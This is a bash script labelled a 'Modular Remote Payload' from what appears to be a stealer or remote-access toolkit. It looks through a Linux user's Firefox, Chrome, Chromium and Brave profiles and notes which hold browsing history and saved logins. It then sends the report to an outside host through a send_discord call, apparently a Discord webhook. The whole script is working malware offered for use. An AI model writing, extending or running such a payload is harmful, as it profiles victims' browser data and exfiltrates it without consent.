#!/bin/bash
# ============================================================
# Browser History Extractor for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🌐 **Browser Data from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Firefox
FF_DIR="$HOME/.mozilla/firefox"
if [[ -d "$FF_DIR" ]]; then
    OUTPUT+="**🦊 FIREFOX**\n"
    PROFILES=$(ls -1 "$FF_DIR" 2>/dev/null | grep -E '\.default')
    OUTPUT+="• Profiles: $(echo "$PROFILES" | wc -l)\n"
    
    for profile in $PROFILES; do
        profile_path="$FF_DIR/$profile"
        if [[ -f "$profile_path/places.sqlite" ]]; then
            OUTPUT+="  - $profile (has history)\n"
        fi
    done
    OUTPUT+="\n"
fi

# Chrome
CHROME_DIR="$HOME/.config/google-chrome/Default"
if [[ -d "$CHROME_DIR" ]]; then
    OUTPUT+="**🔵 CHROME**\n"
    if [[ -f "$CHROME_DIR/History" ]]; then
        size=$(du -h "$CHROME_DIR/History" 2>/dev/null | cut -f1)
        OUTPUT+="• History: $size\n"
    fi
    if [[ -f "$CHROME_DIR/Login Data" ]]; then
        OUTPUT+="• Saved Logins: ✅ (encrypted)\n"
    fi
    OUTPUT+="\n"
fi

# Chromium
CHROMIUM_DIR="$HOME/.config/chromium/Default"
if [[ -d "$CHROMIUM_DIR" ]]; then
    OUTPUT+="**⚪ CHROMIUM**\n"
    if [[ -f "$CHROMIUM_DIR/History" ]]; then
        OUTPUT+="• History: ✅\n"
    fi
    OUTPUT+="\n"
fi

# Brave
BRAVE_DIR="$HOME/.config/BraveSoftware/Brave-Browser/Default"
if [[ -d "$BRAVE_DIR" ]]; then
    OUTPUT+="**🦁 BRAVE**\n"
    OUTPUT+="• Profile found\n\n"
fi

send_discord "$OUTPUT"

